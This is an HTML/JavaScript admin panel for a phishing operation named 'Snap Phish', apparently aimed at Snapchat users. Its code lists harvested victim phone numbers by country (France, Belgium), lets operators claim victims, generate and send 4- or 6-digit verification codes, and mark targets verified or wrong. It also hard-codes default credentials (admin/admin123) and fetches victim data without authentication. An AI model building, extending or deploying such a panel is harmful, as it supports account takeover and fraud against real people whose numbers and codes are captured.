<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Admin Panel — Snap Phish</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }

        body {
            min-height: 100vh;
            background: #0f0f0f;
            padding: 20px;
            color: #fff;
        }

        .admin-container { max-width: 1000px; margin: 0 auto; }

        .admin-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 16px 24px;
            background: #1a1a1a;
            border-radius: 16px;
            border: 1px solid #2a2a2a;
            margin-bottom: 24px;
        }

        .admin-header h1 { font-size: 22px; font-weight: 600; }
        .admin-header h1 span { color: #FFFC00; }
        .admin-header .logout { color: #ff6b6b; cursor: pointer; font-size: 14px; }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
            gap: 12px;
            margin-bottom: 24px;
        }

        .stat-card {
            background: #1a1a1a;
            padding: 16px;
            border-radius: 14px;
            border: 1px solid #2a2a2a;
            text-align: center;
        }

        .stat-card .num { font-size: 28px; font-weight: 700; color: #FFFC00; }
        .stat-card .label { color: #888; font-size: 12px; margin-top: 4px; }

        .queue-tabs {
            display: flex;
            gap: 8px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }

        .queue-tab {
            padding: 10px 20px;
            border-radius: 12px;
            border: 2px solid #2a2a2a;
            background: #141414;
            color: #fff;
            cursor: pointer;
            font-size: 14px;
            font-weight: 500;
            transition: all 0.2s;
        }

        .queue-tab:hover { border-color: #444; }
        .queue-tab.active { border-color: #FFFC00; background: #1a1a1a; }
        .queue-tab .badge {
            background: #FFFC00;
            color: #000;
            padding: 1px 10px;
            border-radius: 20px;
            font-size: 12px;
            margin-left: 6px;
        }

        .numbers-list {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .number-card {
            background: #1a1a1a;
            border-radius: 14px;
            padding: 16px 20px;
            border: 1px solid #2a2a2a;
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            justify-content: space-between;
            transition: border-color 0.2s;
        }

        .number-card .info { flex: 1; min-width: 150px; }
        .number-card .info .num { font-size: 18px; font-weight: 600; color: #fff; }
        .number-card .info .meta { color: #888; font-size: 13px; margin-top: 2px; }

        .number-card .actions {
            display: flex;
            gap: 8px;
            flex-wrap: wrap;
            margin-top: 8px;
        }

        .number-card .actions button {
            padding: 8px 16px;
            border-radius: 10px;
            border: none;
            font-size: 13px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s;
        }

        .number-card .actions button:hover { transform: scale(1.03); }

        .btn-claim { background: #FFFC00; color: #000; }
        .btn-otp4 { background: #FFFC00; color: #000; }
        .btn-otp6 { background: #ffaa00; color: #000; }
        .btn-wrong { background: #ff6b6b; color: #fff; }
        .btn-verified { background: #69db7c; color: #000; }
        .btn-claimed { background: #333; color: #888; cursor: not-allowed; }

        .otp-display {
            display: inline-block;
            background: #141414;
            padding: 4px 16px;
            border-radius: 8px;
            font-family: monospace;
            font-size: 20px;
            color: #FFFC00;
            margin-right: 8px;
        }

        .empty-state {
            text-align: center;
            color: #555;
            padding: 40px 20px;
            font-size: 15px;
        }

        .login-box {
            max-width: 380px;
            margin: 80px auto;
            background: #1a1a1a;
            padding: 32px 28px;
            border-radius: 24px;
            border: 1px solid #2a2a2a;
        }

        .login-box h2 { text-align: center; margin-bottom: 20px; color: #fff; }
        .login-box input {
            width: 100%;
            padding: 14px;
            border-radius: 12px;
            border: 2px solid #2a2a2a;
            background: #121212;
            color: #fff;
            font-size: 16px;
            margin-bottom: 12px;
            outline: none;
        }
        .login-box input:focus { border-color: #FFFC00; }
        .login-box button {
            width: 100%;
            padding: 14px;
            border-radius: 12px;
            border: none;
            background: #FFFC00;
            color: #000;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
        }
        .login-box button:hover { transform: scale(1.02); }

        .hidden { display: none !important; }

        @media (max-width: 600px) {
            .number-card { flex-direction: column; align-items: stretch; }
            .number-card .actions { justify-content: center; }
        }
    </style>
</head>
<body>

    <!-- LOGIN -->
    <div id="loginPage">
        <div class="login-box">
            <h2>🔐 Admin Login</h2>
            <input type="text" id="loginUser" placeholder="Username" value="admin" />
            <input type="password" id="loginPass" placeholder="Password" value="admin123" />
            <button onclick="login()">Login →</button>
            <p style="color:#555;text-align:center;margin-top:12px;font-size:13px;">Default: admin / admin123</p>
        </div>
    </div>

    <!-- ADMIN PANEL -->
    <div id="adminPage" class="hidden">
        <div class="admin-container">
            <div class="admin-header">
                <h1>💀 <span>Snap</span>Phish</h1>
                <span class="logout" onclick="logout()">Logout</span>
            </div>

            <div class="stats-grid" id="statsGrid">
                <div class="stat-card"><div class="num" id="statTotal">0</div><div class="label">Total</div></div>
                <div class="stat-card"><div class="num" id="statPending">0</div><div class="label">Pending</div></div>
                <div class="stat-card"><div class="num" id="statVerified">0</div><div class="label">Verified</div></div>
                <div class="stat-card"><div class="num" id="statWrong">0</div><div class="label">Wrong</div></div>
            </div>

            <div class="queue-tabs" id="queueTabs">
                <div class="queue-tab active" onclick="switchQueue('A')">🇫🇷 France <span class="badge" id="countA">0</span></div>
                <div class="queue-tab" onclick="switchQueue('B')">🇧🇪 Belgium <span class="badge" id="countB">0</span></div>
                <div class="queue-tab" onclick="switchQueue('C')">🌍 Both <span class="badge" id="countC">0</span></div>
            </div>

            <div id="numbersContainer">
                <div class="empty-state">Select a queue to view pending numbers.</div>
            </div>
        </div>
    </div>

    <script>
        let token = null;
        let currentQueue = 'A';
        let refreshInterval = null;

        // ============================================================
        // LOGIN
        // ============================================================
        function login() {
            const username = document.getElementById('loginUser').value;
            const password = document.getElementById('loginPass').value;
            
            fetch('/api/admin/auth', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username, password })
            })
            .then(res => res.json())
            .then(data => {
                if (data.success) {
                    token = data.token;
                    document.getElementById('loginPage').classList.add('hidden');
                    document.getElementById('adminPage').classList.remove('hidden');
                    loadQueues();
                    refreshInterval = setInterval(loadQueues, 3000);
                } else {
                    alert('Invalid credentials');
                }
            });
        }

        function logout() {
            clearInterval(refreshInterval);
            token = null;
            document.getElementById('adminPage').classList.add('hidden');
            document.getElementById('loginPage').classList.remove('hidden');
        }

        // ============================================================
        // QUEUE SWITCH
        // ============================================================
        function switchQueue(queue) {
            currentQueue = queue;
            document.querySelectorAll('.queue-tab').forEach(el => el.classList.remove('active'));
            document.querySelector(`.queue-tab[onclick="switchQueue('${queue}')"]`).classList.add('active');
            loadQueues();
        }

        // ============================================================
        // LOAD QUEUES
        // ============================================================
        function loadQueues() {
            fetch('/api/admin/queues')
                .then(res => res.json())
                .then(data => {
                    // Update counts
                    document.getElementById('countA').textContent = data.A?.filter(e => e.status === 'pending').length || 0;
                    document.getElementById('countB').textContent = data.B?.filter(e => e.status === 'pending').length || 0;
                    document.getElementById('countC').textContent = data.C?.filter(e => e.status === 'pending').length || 0;

                    // Stats
                    const all = Object.values(data).flat();
                    document.getElementById('statTotal').textContent = all.length;
                    document.getElementById('statPending').textContent = all.filter(e => e.status === 'pending').length;
                    document.getElementById('statVerified').textContent = all.filter(e => e.status === 'verified').length;
                    document.getElementById('statWrong').textContent = all.filter(e => e.status === 'wrong').length;

                    // Render queue
                    const entries = data[currentQueue] || [];
                    const pending = entries.filter(e => e.status === 'pending' || e.status === 'otp_sent');
                    const container = document.getElementById('numbersContainer');

                    if (pending.length === 0) {
                        container.innerHTML = '<div class="empty-state">🎯 No pending numbers in this queue.</div>';
                        return;
                    }

                    container.innerHTML = pending.map(entry => `
                        <div class="number-card" id="card-${entry.id}">
                            <div class="info">
                                <div class="num">📱 ${entry.number}</div>
                                <div class="meta">${entry.country} · ${entry.network} · ${entry.timestamp.slice(0,16)}</div>
                                ${entry.otp ? `<div class="otp-display">📨 ${entry.otp}</div>` : ''}
                                ${entry.status === 'otp_sent' ? '<span style="color:#FFFC00;font-size:13px;">⏳ OTP Sent</span>' : ''}
                            </div>
                            <div class="actions" id="actions-${entry.id}">
                                ${entry.status === 'pending' ? `
                                    <button class="btn-claim" onclick="claimNumber('${entry.id}')">🎯 Claim</button>
                                ` : `
                                    <button class="btn-otp4" onclick="sendOTP('${entry.id}', 4)">🔢 4-Digit</button>
                                    <button class="btn-otp6" onclick="sendOTP('${entry.id}', 6)">🔢 6-Digit</button>
                                    <button class="btn-wrong" onclick="markWrong('${entry.id}')">❌ Wrong</button>
                                    <button class="btn-verified" onclick="markVerified('${entry.id}')">✅ Verified</button>
                                `}
                            </div>
                        </div>
                    `).join('');
                });
        }

        // ============================================================
        // CLAIM NUMBER
        // ============================================================
        function claimNumber(queueId) {
            // Update UI to show claimed
            const actions = document.getElementById(`actions-${queueId}`);
            actions.innerHTML = `
                <button class="btn-otp4" onclick="sendOTP('${queueId}', 4)">🔢 4-Digit</button>
                <button class="btn-otp6" onclick="sendOTP('${queueId}', 6)">🔢 6-Digit</button>
                <button class="btn-wrong" onclick="markWrong('${queueId}')">❌ Wrong</button>
                <button class="btn-verified" onclick="markVerified('${queueId}')">✅ Verified</button>
            `;
            
            // Also update status in backend
            fetch('/api/admin/update', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ queueId: queueId, action: 'claimed' })
            }).catch(() => {});
        }

        // ============================================================
        // OTP ACTIONS
        // ============================================================
        function sendOTP(queueId, length) {
            const otp = String(Math.floor(Math.random() * (length === 4 ? 9000 : 900000)) + (length === 4 ? 1000 : 100000));
            
            fetch('/api/admin/update', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    queueId: queueId,
                    action: length === 4 ? 'otp_4' : 'otp_6',
                    otp: otp
                })
            })
            .then(res => res.json())
            .then(data => {
                if (data.success) {
                    // Update UI
                    const card = document.getElementById(`card-${queueId}`);
                    const info = card.querySelector('.info');
                    const otpDisplay = document.createElement('div');
                    otpDisplay.className = 'otp-display';
                    otpDisplay.textContent = `📨 ${otp}`;
                    
                    // Remove old OTP display if exists
                    const oldOtp = card.querySelector('.otp-display');
                    if (oldOtp) oldOtp.remove();
                    
                    info.appendChild(otpDisplay);
                    
                    // Add status
                    const statusSpan = document.createElement('span');
                    statusSpan.style.cssText = 'color:#FFFC00;font-size:13px;margin-left:8px;';
                    statusSpan.textContent = '⏳ OTP Sent';
                    const oldStatus = card.querySelector('span[style]');
                    if (oldStatus) oldStatus.remove();
                    info.appendChild(statusSpan);
                }
            });
        }

        function markWrong(queueId) {
            if (!confirm('Mark as wrong number?')) return;
            fetch('/api/admin/update', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ queueId: queueId, action: 'wrong' })
            })
            .then(() => loadQueues());
        }

        function markVerified(queueId) {
            if (!confirm('Mark as verified?')) return;
            fetch('/api/admin/update', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ queueId: queueId, action: 'verified' })
            })
            .then(() => loadQueues());
        }
    </script>

</body>
</html>
